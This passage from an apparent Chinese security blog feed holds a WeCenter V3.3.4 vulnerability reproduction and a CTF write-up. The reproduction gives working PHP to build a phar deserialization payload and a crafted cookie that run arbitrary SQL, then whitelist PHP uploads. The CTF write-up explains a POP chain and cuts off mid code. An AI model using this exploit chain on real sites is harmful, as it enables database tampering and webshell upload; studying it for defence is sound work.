    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞的实质触发原因是由于可以通过反序列化来执行任意<code>sql</code>语句，导致可以在数据库中更改上传文件的限制类型，最后达到可以上传任意<code>PHP</code>文件的效果</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>漏洞利用点文件位置在<code>./system/aws_model.inc.php</code>，该文件中存在一个<code>AWS_MODEL</code>类，重点关注一下该类的<code>__destruct</code>方法</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/1.png" alt="1"></p><p>该方法遍历了<code>$_shutdown_query</code>，然后执行了query方法，跟进去看一下</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/2.png" alt="2"></p><p>该方法的功能是执行传入的<code>SQL</code>语句，那么也就是说我们只要控制了<code>$_shutdown_query</code>就可以执行任意的语句了，可以注意到该变量是该类中的私有成员变量</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/3.png" alt="3"></p><p>如果存在反序列化的点，我们就可以控制<code>$_shutdown_query</code>的值来执行任意<code>SQL</code>语句，于是接着来寻找反序列化的触发方法</p><p>在本例中反序列化是利用<code>phar</code>进行触发的，触发点文件在<code>./models/account.php</code>，在该文件的<code>account_class</code>类中，存在着这样一个函数</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/4.png" alt="4"></p><p>如果该函数中的<code>$headimgurl</code>是可控的，就可以通过<code>file_get_contents</code>函数来触发<code>phar</code>反序列化，通过搜索发现在<code>./app/account/ajax.php</code>中的<code>synch_img_action</code>函数调用了<code>associate_remote_avatar</code>函数</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/5.png" alt="5">  </p><p>在这里我们需要控制的是<code>$wxuser[&#39;headimgurl&#39;]</code>，而<code>synch_img_action</code>对于<code>$wxuser[&#39;headimgurl&#39;]</code>的获取是来源于数据库中的<code>users_weixin</code>表的，所以我们想控制其值必须找到对<code>users_weixin</code>表中<code>headimgurl</code>字段操作的代码，通过搜索发现<code>./models/openid/weixin/weixin.php</code>文件中<code>bind_account</code>函数存在着对该表的插入操作</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/6.png" alt="6"></p><p>接下来需要找到<code>bind_account</code>函数的调用位置，并且需要使其参数可控，通过搜索关注到<code>binding_action</code>函数，该函数在<code>/app/m/weixin.php</code>文件中</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/7.png" alt="7"></p><p>可以看到该函数中在调用<code>bind_account</code>函数传入参数时，参数的值都是从<code>cookie</code>中获取的，这样我们就可以通过cookie来控制传入的参数值，而<code>binding_action</code>这个方法可以通过路由访问直接调用，所以我们基本上就可以来执行任意SQL语句了</p><p>接着来梳理一下流程，首先我们控制<code>cookie</code>然后调用<code>binding_action</code>函数，使其调用<code>bind_account</code>函数并带入我们控制的参数，该函数将会把我们构造的<code>headimgurl</code>插入到数据库中，在我们调用<code>synch_img_action</code>方法时，该方法会将<code>headimgurl</code>取出来并调用<code>associate_remote_avatar</code>函数，该函数会调用<code>file_get_contents($headimgurl)</code>来触发<code>phar</code>反序列化，进而执行任意<code>sql</code>语句</p><h2 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h2><p>下面首先编写反序列化的生成代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_shutdown_query = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_shutdown_query = <span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> AWS_MODEL();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>在提问的编辑器处进行文件上传，会返回文件路径</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/8.png" alt="8"></p><p>然后编写生成<code>cookie</code>的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="keyword">array</span>();</span><br><span class="line">    $a[<span class="string">'access_token'</span>] = <span class="keyword">array</span>(<span class="string">'openid'</span> =&gt; <span class="string">'1'</span>);</span><br><span class="line">    $a[<span class="string">'access_user'</span>] = <span class="keyword">array</span>(<span class="string">'openid'</span>=&gt;<span class="number">1</span>,<span class="string">'nickname'</span>=&gt;<span class="string">'aaa'</span>,<span class="string">'headimgurl'</span>=&gt;<span class="string">'phar://uploads/question/20200229/f3f9cb0f135c2fd37c2446f863cc15d6.gif'</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//&#123;"access_token":&#123;"openid":"1"&#125;,"access_user":&#123;"openid":1,"nickname":"aaa","headimgurl":"phar:\/\/uploads\/question\/20200229\/f3f9cb0f135c2fd37c2446f863cc15d6.gif"&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>首先带着<code>cookie</code>调用<code>binding_action</code>方法，注意一下<code>cookie</code>的前缀需要抓包获取</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/9.png" alt="9"></p><p>然后去直接触发<code>synch_img_action</code>方法，就可以通过报错函数来得到sql执行结果</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/10.png" alt="10"></p><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>登陆后台可以发现允许上传的文件类型是保存在数据库中的，执行更新后缀名的语句如下</p><p><img src="/2020/02/29/WeCenter-V3-3-4漏洞复现/11.png" alt="11"></p><p>我们可以仿照该语句来将<code>php</code>后缀名加入其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AWS_MODEL</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_shutdown_query = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_shutdown_query = <span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"UPDATE `aws_system_setting` SET `value` = 's:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";' WHERE (`varname` = 'allowed_upload_types')"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> AWS_MODEL();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>按照上面的执行语句的流程，成功执行后即可将<code>php</code>后缀添加到白名单中，之后在编辑器中可直接上传php文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/7077" target="_blank" rel="noopener">https://xz.aliyun.com/t/7077</a></p><p><a href="https://mp.weixin.qq.com/s/uBmo9xXMVk42Qp3BP_x0Vw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uBmo9xXMVk42Qp3BP_x0Vw</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;该漏洞的实质触发原因是由于可以通过反序列化来执行任意&lt;code&gt;sql&lt;/code&gt;语句，导致可以在数据库中更改上传文件的限制类型，最后达到
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>春秋战“疫”easyphp题解</title>
    <link href="https://yml-sec.top/2020/02/26/%E6%98%A5%E7%A7%8B%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Deasyphp%E9%A2%98%E8%A7%A3/"/>
    <id>https://yml-sec.top/2020/02/26/%E6%98%A5%E7%A7%8B%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Deasyphp%E9%A2%98%E8%A7%A3/</id>
    <published>2020-02-26T09:53:29.000Z</published>
    <updated>2020-02-26T12:03:43.819Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目考点：</p><p>反序列化POP链构造</p><p>反序列化字符串逃逸</p></blockquote><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">echo</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        </span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line"></span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目获取到flag的条件是需要使用admin登陆，我们需要找到可控点来执行我们的sql语句，首先就是pop链的寻找</p><p>值得注意的是<code>dbCtrl</code>类中的login方法，该处可以执行任意<code>sql</code>语句，在满足某些条件时可以返回执行的部分结果</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/1.png" alt=""></p><p>那么我们向上寻找如何可以触发该处函数，注意到<code>Info</code>类中的<code>__call</code>方法，我们可以将<code>CtrlCase</code>赋值为一个<code>dbCtrl</code>类的对象</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/2.png" alt="2"></p><p>接着寻找如何触发<code>__call</code>方法，可以看到User类的<code>__toString</code> 方法满足该条件,只需要将<code>nickname</code>赋值为一个<code>Info</code>类的对象即可</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/3.png" alt="3"></p><p>触发<code>__toString</code>的方式也很简单，在<code>UpdateHelper</code>类中将<code>sql</code>变量赋值为<code>User</code>类的对象，这样该类在触发<code>destruct</code>方法的时候会自动触发<code>__toString</code>方法</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/4.png" alt="4"></p><p>现在理一下pop链的顺序</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt;UpdateHelper(__destruct) <span class="variable">$sql</span>=new User</span><br><span class="line">-&gt;User(__toString) <span class="variable">$nickname</span>=new <span class="builtin-name">Info</span>    <span class="variable">$age</span>=<span class="string">"select password from user where username=?"</span></span><br><span class="line">-&gt;<span class="builtin-name">Info</span>(__call) <span class="variable">$CtrlCase</span>=new dbCtrl</span><br><span class="line">-&gt;dbCtrl(login)</span><br></pre></td></tr></table></figure><p>下面需要寻找一下触发反序列化的位置，通过<code>update.php</code>中的代码可以定位到触发点在<code>User</code>类的<code>update</code>方法</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/5.png" alt="5"></p><p>接着跟到<code>getNewinfo</code>方法，该处接收两个参数并且经过一个safe函数的过滤</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/6.png" alt="6"></p><p>这里就涉及到了字符串的逃逸，通过<code>safe</code>函数的过滤使前后字符串的长度不同造成逃逸，我们先来生成所需要的反序列化内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 